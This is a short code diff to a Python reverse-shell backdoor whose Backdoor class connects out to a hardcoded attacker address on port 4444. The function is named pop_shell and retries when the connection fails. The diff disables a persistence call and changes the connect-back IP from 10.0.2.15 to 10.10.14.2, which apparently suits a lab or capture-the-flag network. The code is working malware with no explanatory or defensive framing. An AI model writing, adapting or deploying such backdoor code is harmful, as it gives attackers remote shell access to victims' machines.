@@ -4,7 +4,7 @@ import socket, subprocess, json, os, base64, sys, time, shutil
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.become_persistent()
+        #self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -66,7 +66,7 @@ class Backdoor:
 
 def pop_shell():
     try: 
-        my_backdoor = Backdoor("10.0.2.15", 4444)
+        my_backdoor = Backdoor("10.10.14.2", 4444)
         my_backdoor.run()
     except Exception:
         # if we couldn't connect to the shell, wait 5 minutes and try again
